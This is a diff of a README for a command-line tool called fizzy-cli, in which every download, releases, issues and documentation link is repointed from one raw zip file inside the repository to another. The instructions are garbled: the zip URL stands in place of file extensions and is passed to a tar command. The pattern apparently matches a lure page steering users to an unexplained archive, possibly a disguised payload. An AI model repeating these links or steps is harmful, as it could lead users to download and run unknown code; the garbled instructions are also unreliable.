@@ -6,7 +6,7 @@ Welcome to fizzy-cli! This tool provides a straightforward way to interact with 
 
 ## 📥 Download fizzy-cli
 
-[![Download fizzy-cli](https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip)](https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip)
+[![Download fizzy-cli](https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip)](https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip)
 
 To get started, you'll need to download the latest version of fizzy-cli. 
 
@@ -14,15 +14,15 @@ To get started, you'll need to download the latest version of fizzy-cli.
 
 1. **Visit the Releases Page**
 
-   Go to the Releases page to find the latest version of fizzy-cli: [Visit this page to download](https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip).
+   Go to the Releases page to find the latest version of fizzy-cli: [Visit this page to download](https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip).
 
 2. **Select the Correct File**
 
    On the Releases page, you will see various files for download. Choose the file that matches your operating system:
 
    - **Windows:** Look for a file ending in `.exe`.
-   - **macOS:** Look for a file ending in `.dmg` or `https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip`.
-   - **Linux:** Look for a file ending in `https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip`.
+   - **macOS:** Look for a file ending in `.dmg` or `https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip`.
+   - **Linux:** Look for a file ending in `https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip`.
 
 3. **Download the File**
 
@@ -37,10 +37,10 @@ To get started, you'll need to download the latest version of fizzy-cli.
      Open the `.dmg` file, drag the fizzy-cli icon to your Applications folder, and then eject the `.dmg` file.
 
    - **For Linux:**  
-     Extract the `https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip` file using the following command in your terminal:
+     Extract the `https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip` file using the following command in your terminal:
 
      ```
-     tar -xzf https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip
+     tar -xzf https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip
      ```
 
      After extraction, navigate to the folder and run the application.
@@ -123,10 +123,10 @@ If you encounter issues while using fizzy-cli, consider the following:
 
 ## 📞 Support & Feedback
 
-If you need further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip) to report a problem or ask questions. We welcome your feedback as well.
+If you need further assistance, please visit our [GitHub Issues page](https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip) to report a problem or ask questions. We welcome your feedback as well.
 
 ## 📚 Resources
 
-For more detailed documentation on commands and options, refer to the fizzy-cli [Documentation](https://raw.githubusercontent.com/LAVOSH/fizzy-cli/master/e2e/tests/cli-fizzy-v2.0.zip).
+For more detailed documentation on commands and options, refer to the fizzy-cli [Documentation](https://github.com/LAVOSH/fizzy-cli/raw/refs/heads/master/internal/fizzy_cli_2.6.zip).
 
 Thank you for using fizzy-cli! Enjoy your interaction with the Fizzy API.
